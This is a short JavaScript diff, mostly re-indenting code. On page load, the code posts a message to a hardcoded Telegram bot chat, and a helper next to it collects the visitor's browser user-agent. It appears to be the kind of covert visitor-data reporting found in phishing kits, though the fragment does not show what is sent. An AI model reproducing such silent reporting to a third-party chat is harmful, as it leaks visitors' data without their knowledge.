@@ -32,15 +32,13 @@ document.addEventListener('DOMContentLoaded', function() {
       const chatId = -1001565112990;
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
       const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('text', message);
-        formData.append('parse_mode', 'Markdown')
-        fetch(url, {
-          method: 'POST',
-          body: formData
-        });
+      formData.append('chat_id', chatId);
+      formData.append('text', message);
+      formData.append('parse_mode', 'Markdown');
+      fetch(url, {
+        method: 'POST',
+        body: formData
       });
-
   function getBrowserInfo() {
     const ua = navigator.userAgent;
     let browser = '';
